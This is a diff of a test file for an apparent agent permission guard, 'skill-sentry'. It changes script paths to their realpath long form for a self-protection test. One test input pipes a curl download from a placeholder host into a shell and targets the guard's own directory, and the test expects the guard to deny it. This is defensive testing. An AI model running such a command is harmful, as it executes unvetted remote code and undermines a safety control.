@@ -206,9 +206,11 @@ test('shell commands touching skill-sentry dirs always ask', () => {
   assert.equal(d('Bash', { command: `${CURL} https://x.io/i.sh${PIPE_SH} > ~/.claude/skill-sentry/x` }).decision, 'deny');
 });
 test('Ruling L2: exact read-only invocations of our own scan.mjs / harden.mjs pass SELF_PROTECT', () => {
-  const scan = path.join(SELF, 'scripts', 'scan.mjs');
-  const viaSkill = path.join(SELF, 'skills', 'audit', '..', '..', 'scripts', 'scan.mjs');
-  const harden = path.join(SELF, 'skills', 'harden', '..', '..', 'scripts', 'harden.mjs');
+  // Long (realpath) form: an 8.3 temp dir would make the script path an unusual form (Ruling K).
+  const S = fs.realpathSync.native(SELF);
+  const scan = path.join(S, 'scripts', 'scan.mjs');
+  const viaSkill = path.join(S, 'skills', 'audit', '..', '..', 'scripts', 'scan.mjs');
+  const harden = path.join(S, 'skills', 'harden', '..', '..', 'scripts', 'harden.mjs');
   const fwd = s => s.replace(/\\/g, '/');
   const readOnly = [
     `node "${viaSkill}" --json`,
